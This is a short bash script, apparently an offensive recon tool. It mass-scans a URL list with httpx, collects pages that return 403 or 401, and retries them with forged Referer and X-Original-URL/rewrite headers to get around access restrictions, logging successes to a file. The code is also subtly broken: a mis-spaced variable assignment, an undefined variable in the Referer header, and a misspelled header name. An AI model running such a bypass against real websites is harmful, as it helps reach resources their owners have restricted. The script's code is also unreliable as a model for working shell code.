#!/bin/bash

function bypass(){
	path=$(echo $1  | unfurl format %p?%q)
	url= $(echo $1  | unfurl format %s://%d)
	echo "$1"   | httpx -H  "Referer: $i "           -mc 200  -retries 2 |tee -a 403_bypass.txt
	echo "$1"   | httpx -H  "X-Original-URL: $path"  -mc 200  -retries 2 |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Original-URL: $path"  -mc 200  -retries 2 |tee -a 403_bypass.txt
	echo "$1"   | httpx -H  "X-Rwrite-URL: $path"    -mc 200  -retries 2 |tee -a 403_bypass.txt
	echo "$url" | httpx -H  "X-Rwrite-URL: $path"    -mc 200  -retries 2 |tee -a 403_bypass.txt


}

cat $1 | httpx -status-code -threads 500 -retries 2 -o status.txt
cat  ./status.txt | grep -E  "403|401" |cut  -d " " -f 1 |sort -u -o 40x_urls.txt
export -f  bypass
cat  40x_urls.txt |xargs -n1 -P 200  -I{} bash -c 'bypass "$@"' _ {}
